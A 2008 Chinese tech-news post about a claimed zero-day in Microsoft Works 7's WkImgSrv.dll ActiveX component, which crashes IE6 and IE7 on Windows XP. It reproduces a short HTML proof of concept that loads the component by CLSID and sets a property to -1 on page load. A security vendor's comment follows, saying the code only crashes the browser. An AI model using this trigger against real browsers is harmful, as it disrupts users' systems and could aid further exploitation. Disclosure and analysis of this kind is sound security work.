---
title: Windows组件0Day漏洞　通杀IE6与IE7浏览器
description: 中国IT实验室4月21日报道：近日收到网友发来的邮件，反映了一个Windows0Day漏洞。并在其博客中给出了相关代码。[0day]MicrosoftWorks7WkImgSrv.dllcrashPOC，dll版本7.03.0616.0，IE7+WindowsXPSP2测试通过。
date: 2008-04-23 08:51:42
category: 漏洞信息
tags: ['0day', 'Windows']
post_id: 460
alias: Windows-Microsoft-Works-0day
ViewNums: 4847
---

中国IT实验室4月21日报道：近日收到网友发来的邮件，反映了一个[Windows](/tags/Windows) [0Day](/tags/0day)漏洞。并在其博客中给出了相关[代码](/tags/%E6%BA%90%E7%A0%81)。
```
[0day]Microsoft Works 7 WkImgSrv.dll crash POC，dll版本7.03.0616.0，IE7+Windows XP SP2 测试通过。

[html]
[head]
[title]Microsoft Works 7 WkImgSrv.dll crash POC[/title]
[script language="JavaScript"]
 function payload() {
 var num = -1;
 obj.WksPictureInterface = num;
 }
 [/script]
[/head]
[body onload="JavaScript: return payload();"]
[object classid="clsid:00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6" id="obj"]
[/object]
[/body]
[/html]
```
与金山专家李铁军联系，得到了珠海研发中心的回复，如下：

近几天网络上流传着一个传说为IE 0DAY的POC代码，在Windows XP系统环境下通杀了IE6和IE7，其它系统并未经过测试。其实这个[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)并不是存在于IE，而是Microsoft Works的组件被挖掘出漏洞，部分的Windows XP预装了Microsoft Works，所以就出现了过全补丁系统的漏洞（如华硕易PC 就预装了Microsoft Works）。这段攻击代码会让浏览器崩溃，目前尚不能因此传播[恶意软件](http://www.virus-info.cn//tags/%E6%B5%81%E6%B0%93%E8%BD%AF%E4%BB%B6)。

